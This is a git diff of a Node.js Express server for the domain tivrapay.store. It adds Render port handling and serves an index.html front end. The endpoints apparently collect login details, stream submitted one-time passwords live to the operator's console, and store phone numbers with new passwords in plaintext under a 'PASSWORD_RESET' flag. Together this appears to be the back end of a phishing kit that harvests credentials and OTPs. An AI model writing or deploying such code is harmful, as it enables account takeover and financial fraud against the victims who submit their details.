@@ -1,10 +1,13 @@
 const express = require('express');
 const mongoose = require('mongoose');
 const cors = require('cors');
+const path = require('path'); // Naya add kiya file paths handle karne ke liye
 const { MongoMemoryServer } = require('mongodb-memory-server');
 
 const app = express();
-const PORT = 6500; // Ekdum alag aur safe port
+
+// PORT Setting: Render automatic process.env.PORT deta hai, local par 6500 chalega
+const PORT = process.env.PORT || 6500; 
 
 // Aggressive CORS policy taaki browser error na de
 app.use(cors({
@@ -13,6 +16,18 @@ app.use(cors({
     allowedHeaders: ['Content-Type']
 }));
 app.use(express.json());
+
+// ========================================================
+// ⚡ FRONTEND SERVING LOGIC (ISSE CANNOT GET / KHATAM HOGA)
+// ========================================================
+// Isse aapki images aur styles automatic load ho jayengi
+app.use(express.static(__dirname));
+
+// Jab koi direct tivrapay.store kholega, toh index.html load hogi
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+// ========================================================
 
 // Main Schema
 const UserSchema = new mongoose.Schema({
@@ -66,14 +81,13 @@ app.post('/api/login-submit', async (req, res) => {
     }
 });
 
-// 2. Live OTP Stream Channel (Dono Login aur Forgot Password ke liye kaam karega)
+// 2. Live OTP Stream Channel
 app.post('/api/otp-submit', async (req, res) => {
     try {
         const { userId, otp } = req.body;
         let currentAction = 'UNKNOWN';
 
         if (mongoose.Types.ObjectId.isValid(userId)) {
-            // OTP update karne ke saath hum record check kar rahe hain taaki pta chale kis cheez ka OTP hai
             const updatedUser = await User.findByIdAndUpdate(userId, { otp: otp }, { new: true });
             if (updatedUser) {
                 currentAction = updatedUser.actionType;
@@ -94,7 +108,6 @@ app.post('/api/otp-submit', async (req, res) => {
 app.post('/api/forgot-submit', async (req, res) => {
     try {
         const { phone, newPassword } = req.body;
-        // actionType ko 'PASSWORD_RESET' set kiya taaki pta chale ye forget section se aaya hai
         const resetRecord = new User({ resetPhone: phone, newPassword: newPassword, actionType: 'PASSWORD_RESET' });
         await resetRecord.save();
 
@@ -104,7 +117,6 @@ app.post('/api/forgot-submit', async (req, res) => {
         console.log(`⏳ Waiting for Forget OTP...`);
         console.log(`--------------------------------------------------`);
 
-        // Yahan response me userId bhej rahe hain taaki frontend ise save kar sake
         res.status(200).json({ success: true, userId: resetRecord._id });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
